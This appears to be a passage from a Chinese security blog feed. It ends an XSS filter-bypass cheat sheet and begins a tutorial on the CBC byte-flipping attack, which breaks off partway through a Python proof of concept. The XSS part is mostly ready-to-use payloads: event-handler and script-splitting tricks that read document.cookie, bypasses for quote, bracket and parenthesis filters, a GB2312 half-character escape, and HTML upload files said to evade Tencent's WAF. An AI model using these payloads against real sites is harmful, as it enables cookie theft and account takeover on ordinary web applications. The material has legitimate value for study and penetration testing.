&lt;!,&lt;?可以被解析成&lt;，所以可以使用以下的payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;//     style=x:expression\28write(1)\29&gt; // Works upto IE7 参考http://html5sec.org/#71</span><br><span class="line"> // Works upto IE9 参考http://html5sec.org/#115</span><br><span class="line">&lt;%div%20style=xss:expression(prompt(1))&gt;     // Works Upto IE7</span><br></pre></td></tr></table></figure><h2 id="代码拆分执行"><a href="#代码拆分执行" class="headerlink" title="代码拆分执行"></a>代码拆分执行</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=<span class="string">&#x27;javascript:&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">z=z+<span class="string">&#x27;alert(/xxss/)&#x27;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(z)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>     //可绕过字符长度限制</span><br></pre></td></tr></table></figure><p><strong>chrome浏览器喜欢去补全缺失的引号。如果引号被过滤那么直接省略，chrome将会正确的帮你补全缺失的引号在URL和script中。</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.cookie)</span>&gt;</span>xxs link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="闭合script"><a href="#闭合script" class="headerlink" title="闭合script"></a>闭合script</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&quot;123&lt;/script&gt;&lt;script&gt;alert(1);//&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="闭合优先级高于双引号的标签"><a href="#闭合优先级高于双引号的标签" class="headerlink" title="闭合优先级高于双引号的标签"></a>闭合优先级高于双引号的标签</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">&lt;iframe&gt;</span></span><br><span class="line"><span class="comment">&lt;noframes&gt;</span></span><br><span class="line"><span class="comment">&lt;noscript&gt;</span></span><br><span class="line"><span class="comment">&lt;script&gt;</span></span><br><span class="line"><span class="comment">&lt;style&gt;</span></span><br><span class="line"><span class="comment">&lt;title&gt;</span></span><br><span class="line"><span class="comment">&lt;xmp&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;noframes&gt;</span></span><br><span class="line"><span class="comment">&lt;img src=&quot;//t.tt&lt;/noframes&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span></span><br><span class="line"><span class="comment">&lt;/noframes&gt;</span></span><br></pre></td></tr></table></figure><h2 id="圆括号被过滤"><a href="#圆括号被过滤" class="headerlink" title="圆括号被过滤"></a>圆括号被过滤</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:window.onerror=alert;throw 1&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--用location中<span class="variable constant_">URL</span>编码小括号绕过--&gt;</span><br><span class="line"><span class="string">&quot; autofocus onfocus=location=&#x27;javasCript:alert%25281%2529&#x27; x=&quot;</span></span><br></pre></td></tr></table></figure><h2 id="尖括号被过滤"><a href="#尖括号被过滤" class="headerlink" title="尖括号被过滤"></a>尖括号被过滤</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autofocus onfocus=<span class="title function_">alert</span>(<span class="number">1</span>) x=<span class="string">&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; </span><br><span class="line">    <span class="keyword">var</span> s = <span class="string">&quot;u003cimg src=1 onerror=alert(/xss/)u003e&quot;</span>; </span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;s&#x27;</span>).<span class="property">innerHTML</span> = s; </span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">有时需要获取cokie,但用到单引号很多 可以用<span class="variable language_">this</span>.<span class="property">name</span>传入</span><br><span class="line"><span class="string">&quot; name=javasCript:alert%25281%2529 autofocus onfocus=location=this.name x=&quot;</span></span><br></pre></td></tr></table></figure><p>js中字符转ascii码的函数为charCodeAt()</p><p>js ascii码转字符的函数：String.fromCharCode()</p><p>转成ascii码后。再将其转回字符。这样子在输入的时候就没有单引号。就不会受单引号转义的限制。</p><h2 id="异步拉取用户信息"><a href="#异步拉取用户信息" class="headerlink" title="异步拉取用户信息"></a>异步拉取用户信息</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;   </span><br><span class="line">   <span class="keyword">function</span> <span class="title function_">callback</span>(<span class="params">obj</span>)   </span><br><span class="line">   &#123;   </span><br><span class="line">       <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;test&quot;</span>).<span class="property">innerHTML</span> = obj.<span class="property">name</span>;   </span><br><span class="line">   &#125; </span><br><span class="line">&lt;/script&gt; </span><br></pre></td></tr></table></figure><h2 id="半字符问题-只对单双引号和尖括号进行转义"><a href="#半字符问题-只对单双引号和尖括号进行转义" class="headerlink" title="半字符问题(只对单双引号和尖括号进行转义)"></a>半字符问题(只对单双引号和尖括号进行转义)</h2><p>对于gb2312编码，” [0xc0] “是一个合法的编码，显示为：”繺”。<br>对于UTF-8编码，在IE6下，上述组合也是一个合法的编码。<br>其中[0xc0]表示一个十六进制的值。</p><p>现在修改昵称为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0xc0</span>]u003cimg src=<span class="number">1</span> onerror=<span class="title function_">alert</span>(<span class="regexp">/xss/</span>) [<span class="number">0xc0</span>]u003e </span><br></pre></td></tr></table></figure><p>getcontent输出：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;[0xc0]\u003cimg src=1 onerror=alert(/xss/) [0xc0]\u003e&quot;</span><span class="punctuation">&#125;</span>);</span><br></pre></td></tr></table></figure><p>由于半字符[0xc0]的存在，在解释上述JS代码时，等价于：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;繺u003cimg src=1 onerror=alert(/xss/) 繺u003e&quot;</span><span class="punctuation">&#125;</span>);</span><br></pre></td></tr></table></figure><p>可见，转义序列u003c终于又回来了，显示结果如下：</p><p>上述昵称中并没有出现单双引号，尖括号，所以如果后台只是对单双引号和尖括号进行转义，那么是可以被绕过防御的。</p><p><strong>总结：</strong></p><p>（1） 利用场景：输出内容在JS代码里，并且被动态显示出来（如使用innerHTML）。<br>（2） 测试方法：截获请求包，修改参数为：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%c0u003cimg+src%3d1+onerror%3dalert(<span class="regexp">/xss/</span>)+%c0u003e</span><br></pre></td></tr></table></figure><p>（3） 防御方法：后台对半字符，反斜杠，单双引号，尖括号进行处理。</p><p>编辑点评:关于xss绕过的方式有很多，不少程序员以及小黑都认为过滤了&lt;、&gt;、’、”，就真的安全的，实际来说，只要针对这些字符进行一定的转义，就能成功绕过！</p><h2 id="绕过magic-quotes-gpc"><a href="#绕过magic-quotes-gpc" class="headerlink" title="绕过magic_quotes_gpc"></a>绕过magic_quotes_gpc</h2><p>magic_quotes_gpc&#x3D;ON是php中的安全设置，开启后会把一些特殊字符进行轮换，比如’(单引号)转换为\’，”(双引号)转换为\”，\转换为\</p><p>比如：<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>会转换为 <code>&lt;script&gt;alert(\”xss\”);&lt;/script&gt;</code>,这样我们的xss就不生效了。</p><p>针对开启了magic_quotes_gpc的网站，我们可以通过javascript中的String.fromCharCode方法来绕过，我们可以把alert(“XSS”);转换为</p><p>String.fromCharCode(97, 108, 101, 114, 116, 40, 34, 88, 83, 83, 34,41)那么我们的XSS语句就变成了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">40</span>, <span class="number">34</span>, <span class="number">88</span>,<span class="number">83</span>, <span class="number">83</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">59</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>String.fromCharCode()是javascript中的字符串方法，用来把ASCII转换为字符串。</p><p>最后使用 <code>&lt;script&gt;转换后的放到这里&lt;/script&gt;</code>包含即可。</p><h2 id="改变大小写"><a href="#改变大小写" class="headerlink" title="改变大小写"></a>改变大小写</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">ScRipt</span>&gt;<span class="title class_">ALeRt</span>(“<span class="variable constant_">XSS</span>”);&lt;/sCRipT&gt;</span><br></pre></td></tr></table></figure><h2 id="空格-回车-Tab"><a href="#空格-回车-Tab" class="headerlink" title="空格&#x2F;回车&#x2F;Tab"></a>空格&#x2F;回车&#x2F;Tab</h2><p>假设过滤函数进一步又过滤了javascript等敏感字符串，只需对javascript进行小小的操作即可绕过，例如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src= <span class="string">&quot;java　　script:alert(‘xss‘);&quot;</span> width=<span class="number">100</span>&gt;</span><br></pre></td></tr></table></figure><p>这里之所以能成功绕过，其实还得益于JS自身的性质：Javascript通常以分号结尾，如果解析引擎能确定一个语句时完整的，且行尾有换行符，则分号可省略</p><p>而如果不是完整的语句，javascript则会继续处理，直到语句完整结束或分号。</p><p>像&#96;&#96;&lt;img src&#x3D; “javascript:　alert(&#x2F;xss&#x2F;); width&#x3D;100&gt; &#96;同样能绕过</p><h2 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src= <span class="string">&quot;javascriptt&amp;#alert(/xss/);&quot;</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="文件上传XSS-TencentWAF"><a href="#文件上传XSS-TencentWAF" class="headerlink" title="文件上传XSS(TencentWAF)"></a>文件上传XSS(TencentWAF)</h2><p>XSS文件上传(html格式)绕过WAF</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(document.cookie)&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Cheet-sheet绕过速查表"><a href="#Cheet-sheet绕过速查表" class="headerlink" title="Cheet-sheet绕过速查表"></a>Cheet-sheet绕过速查表</h2><p><a href="https://demo.l0ki.top/#portfolio">XSSBypass速查PDF</a></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200702123026270.png" alt="image-20200702123026270"></p><h2 id="补充框"><a href="#补充框" class="headerlink" title="补充框"></a>补充框</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">有好的补充可以在评论区留言...待续...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CBC Byte Flipping Attack</title>
      <link href="/2020/06/29/CBC-Byte-Flipping-Attack/"/>
      <url>/2020/06/29/CBC-Byte-Flipping-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-什么是CBC字节翻转"><a href="#0x01-什么是CBC字节翻转" class="headerlink" title="0x01 什么是CBC字节翻转"></a>0x01 什么是CBC字节翻转</h2><blockquote><p><strong>通过损坏密文字节来改变明文字节</strong>。（注：借助CBC内部的模式）借由此可以绕过过滤器，或者改变用户权限提升至管理员，又或者改变应用程序预期明文以尽猥琐之事。</p></blockquote><p>CBC全称Cipher Block Chaining模式（密文分组链接模式），“分组“是指加密和解密过程都是以分组进行的。</p><p>每一个分组大小为128bits(16字节)，如果明文的长度不是16字节的整数倍，需要对最后一个分组进行填充(padding)，使得最后一个分组长度为16字节。</p><p>“链接”是指密文分组分组像链条一样相互连接在一起。</p><h2 id="0x02-异或运算（XOR）"><a href="#0x02-异或运算（XOR）" class="headerlink" title="0x02 异或运算（XOR）"></a>0x02 异或运算（XOR）</h2><p>计算机存储的数据是以二进制的格式存入的，把两段二进制数字进行异或运算的话，相同的得0，不同的得1，例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0101</span> XOR <span class="number">0110</span> = <span class="number">0011</span></span><br><span class="line"><span class="number">65</span> XOR <span class="number">42</span> = <span class="number">107</span>(十进制数先转为二进制再进行异或操作）</span><br></pre></td></tr></table></figure><p>字符在计算机中有对应的&#96;&#96;ascii <code>码值，对字符进行异或运算就是将两串字符对应的ascii码值相异或把得到的</code>ascii&#96;码值对应的字符相异或，异或运算具有可逆性，如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">65</span> XOR <span class="number">42</span> = <span class="number">107</span> 则 <span class="number">107</span> XOR <span class="number">42</span> = <span class="number">65</span></span><br></pre></td></tr></table></figure><p>因此对于异或运算 <code>a XOR b = c</code>，我们只需知道&#96;&#96;abc <code>中的任意两个，将这两个相异或便可求出第三个，这个性质也是我们进行</code>padding oracle attack&#96;的关键。</p><blockquote><p>当我们的一个值C是由A和B异或得到<br>C &#x3D; A XOR B<br>那么<br>A XOR B XOR C很明显是&#x3D;0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A &#x3D; B XOR C<br>因此，A XOR B XOR C等于0。</p><p>有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p></blockquote><h2 id="0x03-CBC加密模式"><a href="#0x03-CBC加密模式" class="headerlink" title="0x03 CBC加密模式"></a>0x03 CBC加密模式</h2><p><strong>简述</strong></p><p>CBC是一种加密的模式，经常把DES或者AES算法（两种分组密码算法）作为加密使用的算法。</p><p>所谓分组加密顾名思义，就是按一定规则把明文分成一块一块的小组，DES分组长度是八字节而AES分组长度是十六字节，每组长度一致，加密时是按组进行加密的。</p><p>加密时，第一个明文分组，需要通过和IV(初始化向量)进行异或处理之后，才可以进行加密处理</p><p>每一个明文分组(除了第一个明文分组)加密之前都需要和前一个密文分组进行异或处理之后，才可以进行加密处理</p><h3 id="3-1-加密公式"><a href="#3-1-加密公式" class="headerlink" title="3.1 加密公式"></a>3.1 加密公式</h3><p><strong>高数公式:</strong></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200621200245404.png" alt="image-20200621200245404"></p><p><strong>民间自创:</strong></p><ul><li>*Ciphertext-0 &#x3D; Encrypt(Plaintext XOR IV)*—只用于第一个组块</li><li>*Ciphertext-N&#x3D; Encrypt(Plaintext XOR Ciphertext-N-1)*—用于第二及剩下的组块</li></ul><h3 id="3-2-加密过程"><a href="#3-2-加密过程" class="headerlink" title="3.2 加密过程"></a>3.2 加密过程</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200621195511411.png" alt="image-20200621195511411"></p><ul><li><strong>Plaintext</strong>：待加密的数据。</li><li><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</li><li><strong>Key</strong>：被一些如AES的对称加密算法使用。</li><li><strong>Ciphertext</strong>：加密后的数据。</li></ul><p><strong>过程</strong></p><ul><li>将明文的第一个分组与IV进行异或，送入加密模块进行加密，得到第一个密文分组</li><li>从第二个明文分组开始，将明文分组与前一个密文分组进行异或</li><li>将第2步得到的结果送入加密模块进行加密</li><li>将每一个密文分组拼接起来形成密文</li></ul><p><strong>理解</strong></p><ul><li>首先将明文分组(常见的以16字节为一组)，位数不足的使用特殊字符填充。</li><li>生成一个随机的初始化向量(IV)和一个密钥。</li><li>将IV和第一组明文异或。</li><li>用密钥对3中xor后产生的密文加密。</li><li>用4中产生的密文对第二组明文进行xor操作。</li><li>用密钥对5中产生的密文加密。</li><li>重复4-7，到最后一组明文。</li><li>将IV和加密后的密文拼接在一起，得到最终的密文。</li></ul><p><strong>特性</strong></p><p>从第一块开始，首先与一个初始向量iv异或（iv只在第一处作用），然后把异或的结果配合key进行加密，得到第一块的密文，并且把加密的结果与下一块的明文进行异或，一直这样进行下去。因此这种模式最重要的特点就是：</p><blockquote><p>CBC工作于一个固定长度的比特组，将其称之为<em>块</em>。</p><p><em><strong>前一块的密文用来产生后一块的密文。</strong></em></p></blockquote><p><strong>总述</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>对明文进行分组，使每组长度相同（通常为 <span class="number">8</span> 或 <span class="number">16</span> 字节，取决于加密算法），对长度不足的分组进行填充，通常，填充遵循的是 PKCS#<span class="number">5</span> 标准，即填充的字符即为需要填充的字符的个数（十六进制表示）</span><br><span class="line"><span class="number">2.</span>随机生成一个 Initialization Vector（IV），将第一个明文分组与 IV 作异或运算</span><br><span class="line"><span class="number">3.</span>将 <span class="number">2</span> 的结果进行加密，得到第一个明文分组的密文</span><br><span class="line"><span class="number">4.</span>从第二个明文分组开始，先将明文分组与上一组的密文作异或运算，再将结果进行加密，得到该分组的密文</span><br><span class="line"><span class="number">5.</span>将IV和这n块密文连在一起便得到了明文用CBC模式加密后的密文。</span><br></pre></td></tr></table></figure><h2 id="0x04-CBC解密模式"><a href="#0x04-CBC解密模式" class="headerlink" title="0x04 CBC解密模式"></a>0x04 CBC解密模式</h2><p><strong>简述</strong></p><p>第一个密文分组，解密之后，需要通过和IV进行异或处理，才可以得到第一个明文分组</p><p>每一个密文分组（除第一个密文分组外）经过解密处理之后，都需要和前一个密文分组进行异或处理，才可以得到对应的明文分组</p><h3 id="4-1-解密公式"><a href="#4-1-解密公式" class="headerlink" title="4.1 解密公式"></a>4.1 解密公式</h3><p><strong>高数公式:</strong></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200621201243451.png" alt="image-20200621201243451"></p><p><strong>民间自创:</strong></p><blockquote><p><strong>Ciphertext-N-1（密文-N-1）是用来产生下一块明文</strong>；这就是字节翻转攻击开始发挥作用的地方。</p><p>如果我们改变<em>Ciphertext-N-1</em>（密文-N-1）的一个字节，然后与下一个解密后的组块异或，我们就可以得到一个不同的明文了！</p></blockquote><ul><li><em>Plaintext-0 &#x3D; Decrypt(Ciphertext) XOR IV</em>—只用于第一个组块</li><li><em>Plaintext-N&#x3D; Decrypt(Ciphertext) XOR Ciphertext-N-1</em>—用于第二及剩下的组块</li></ul><h3 id="4-2-解密过程"><a href="#4-2-解密过程" class="headerlink" title="4.2 解密过程"></a>4.2 解密过程</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200621200547217.png" alt="image-20200621200547217"></p><ul><li><strong>Plaintext</strong>：待加密的数据。</li><li><strong>IV</strong>：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</li><li><strong>Key</strong>：被一些如AES的对称加密算法使用。</li><li><strong>Ciphertext</strong>：加密后的数据。</li></ul><p><strong>过程</strong></p><ul><li>将密文的第一个分组进行解密，得到的结果与IV进行异或处理，得到第一个明文分组。</li><li>从第二个密文分组开始，先对每一个密文分组进行解密处理，到第3步。</li><li>将第2步得到的结果与前一个密文分组进行异或处理，得到对应的明文分组。</li><li>将每一个明文分组拼接在一块，便得到原先的明文。</li></ul><p><strong>理解</strong></p><ul><li>从密文中提取出IV，然后将密文分组。</li><li>使用密钥对第一组的密文解密，然后和IV进行xor得到明文。</li><li>使用密钥对第二组密文解密，然后和2中的密文xor得到明文。</li><li>重复2-3，直到最后一组密文。</li></ul><p><strong>特性</strong></p><p>解密过程，解密的过程其实只要理解了加密，反过来看解密过程就也很简单了，同样的：</p><blockquote><p>CBC工作于一个固定长度的比特组，将其称之为<em>块</em>。</p><p><em><strong>前一块密文参与下一块密文的还原</strong></em>。</p></blockquote><p><strong>总述</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>首先按照一定长度将密文分好组，其中密文的第一组是初始的IV值，第二组密文对应第一组明文。</span><br><span class="line"><span class="number">2.</span>分好组后，从第二组密文开始依次用算法进行解密运算得到n组中间值，这时候得到的值并不是明文，要想得到明文还需进行一次异或操</span><br><span class="line">作，第一个中间值与初始IV值异或得到明文，第二个中间值与前一组的密文异或得到第二组明文，以此类推最后一组中间值与倒数第二组密</span><br><span class="line">文进行亦或便可得到最后一组明文，将所有的明文连在一起便是最终的明文。</span><br></pre></td></tr></table></figure><h2 id="0x05-CBC字节翻转攻击"><a href="#0x05-CBC字节翻转攻击" class="headerlink" title="0x05 CBC字节翻转攻击"></a>0x05 CBC字节翻转攻击</h2><h3 id="5-1-攻击原理"><a href="#5-1-攻击原理" class="headerlink" title="5.1 攻击原理"></a>5.1 攻击原理</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200622122828477.png" alt="image-20200622122828477"></p><p>以第一个分组为例：<br><strong>加密过程：</strong></p><p><strong>将原明文称为sourceStr，</strong></p><p><strong>初始IV称为old_IV,</strong></p><p><strong>sourceStr^old_IV得到中间值middlecipher。</strong></p><p><strong>middlecipher经过分组加密算法(aes,des)得到第一组密文。</strong></p><p><strong>解密过程：</strong></p><p><strong>第一组密文经分组解密算法得到中间值middlecipher，</strong></p><p><strong>middlecipher^old_IV得到原明文sourceStr。</strong></p><p>同理正常解密过程 <code>sourceStr=middlecipher^old_IV</code></p><p>我们希望通过提交构造的&#96;&#96;evil_IV <code>得到我们想要的解密明文</code>targeStr&#96;，</p><p>也就是 <code>targeStr=middlecipher^evil_IV</code></p><p>而得到evil_IV的方式为:<code>evil_IV=middlecipher^targeStr</code></p><p>但是需要知道&#96;&#96;middlecipher&#96;</p><p>由上面可知中心为&#96;&#96;middlecipher&#96;，</p><p>只要得到了 <code>middlecipher</code>就可以构造出 <code>evil_IV</code>。</p><p>因为 <code>sourceStr=middlecipher^old_IV</code></p><p>所以知道了明文 <code>sourceStr</code>和 <code>old_IV</code>就能异或出 <code>middlecipher</code>。</p><p>即 <code>evil_IV=old_IV^sourceStr^targetStr</code></p><h3 id="5-2-POC"><a href="#5-2-POC" class="headerlink" title="5.2 POC"></a>5.2 POC</h3><blockquote><p>这是在知道明文和IV的情况下并可以提交我们构造的IV的情况下,我们可改变第一个明文分组的值</p></blockquote><p><strong>已知明文sourceStr和old_IV可以构造Evil-IV来改变明文为目标明文targetStr（这里只能改变第一个分组）。</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto <span class="keyword">import</span> Random</span><br><span class="line">SECRET_KEY=codecs.encode(os.urandom(<span class="number">8</span>),<span class="string">&#x27;hex_codec&#x27;</span>).upper() <span class="comment">#16byte密钥</span></span><br><span class="line">IV=Random.new().read(<span class="number">16</span>)    <span class="comment">#16byte初始向量</span></span><br><span class="line"></span><br><span class="line">sourceStr=<span class="string">&#x27;hello,world&#x27;</span></span><br><span class="line">aes = AES.new(SECRET_KEY,AES.MODE_CBC,IV)</span><br><span class="line">length = <span class="number">16</span></span><br><span class="line">count = <span class="built_in">len</span>(sourceStr)</span><br><span class="line">add = length - (count % length)</span><br><span class="line">sourceStr = sourceStr + (<span class="built_in">chr</span>(<span class="number">0</span>) * add) <span class="comment">#正常情况下这里应该是补\x05 5由16-11得来，但由于我省事不想处理结果后面出现的乱码，就省事改为\x00了</span></span><br><span class="line">cipher=aes.encrypt(sourceStr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;明文为:&quot;</span>,sourceStr)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;秘钥为:&quot;</span>,SECRET_KEY)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;IV为：&quot;</span>,IV)</span><br><span class="line"><span class="comment"># print(&quot;明文序列为:&quot;,list(sourceStr))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;密文为:&quot;</span>,aes.encrypt(sourceStr))</span><br><span class="line"></span><br><span class="line">old_IVList=[]</span><br><span class="line">sourceStrList=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(codecs.encode(IV,<span class="string">&#x27;hex_codec&#x27;</span>).decode()),<span class="number">2</span>):</span><br><span class="line">    old_IVList.append(<span class="built_in">int</span>(codecs.encode(IV,<span class="string">&#x27;hex_codec&#x27;</span>).decode()[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span 